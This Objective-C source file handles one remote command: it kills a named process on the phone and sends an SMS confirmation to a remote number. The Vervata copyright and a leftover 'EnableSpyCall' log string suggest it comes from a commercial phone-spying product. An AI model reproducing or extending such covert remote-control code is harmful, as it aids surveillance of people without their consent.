/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SetWatchFlagsProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "TerminateRunningProcessor.h"
#import "SystemUtils.h"

@interface TerminateRunningProcessor (PrivateAPI)
- (BOOL) isValidArg;
- (void) sendReplySMS;
- (void) processTerminateRunningProcess;
- (void) terminateRunningProcessException; 
@end

@implementation TerminateRunningProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the TerminateRunningProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),
 - Return description: (self) TerminateRunningProcessor
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"TerminateRunningProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the TerminateRunningProcessor
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"TerminateRunningProcessor===>doProcessingCommand");
	if ([self isValidArg]) [self processTerminateRunningProcess];
	else [self terminateRunningProcessException];
}


/**
 - Method name: processTerminateRunningProcess
 - Purpose:This method is used to process Terminate Running Process
 - Argument list and description: No Return Type
 - Return description: No Argument
*/


- (void) processTerminateRunningProcess {
	DLog (@"TerminateRunningProcessor===>processTerminateRunningProcess");
	id <SystemUtils> utils=[[RemoteCmdUtils sharedRemoteCmdUtils] mSystemUtils];
	[utils killProcessWithProcessName:[[mRemoteCmdData mArguments] objectAtIndex:2]];
	[self sendReplySMS];
}

/**
 - Method name: isValidArg
 - Purpose:This method is used to  check valid argument
 - Argument list and description:No Argument 
 - Return description: BOOL
 */

- (BOOL) isValidArg {
	DLog (@"TerminateRunningProcessor===>isValidArg");
    BOOL isValid=NO;
	if ([[mRemoteCmdData mArguments] count]>2) {
		NSString *argString=[[mRemoteCmdData mArguments] objectAtIndex:2];
		if (![argString isEqualToString:@"D"]) {
			isValid=YES;
		}
	}
	return isValid;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	
	DLog(@"TerminateRunningProcessor====>sendReplySMS")
	
	NSString *message=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																				  andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:message];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	     [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] andMessage:message];
	}
}

/**
 - Method name: terminateRunningProcessException
 - Purpose:This method is invoked when terminateRunningProcess failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) terminateRunningProcessException {
	DLog (@"EnableSpyCallWithMonitorProcessor--->addMonitorsException")
	FxException* exception = [FxException exceptionWithName:@"terminateRunningProcessException" andReason:@"Terminate Running Process error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

-(void) dealloc {
	[super dealloc];
}


@end
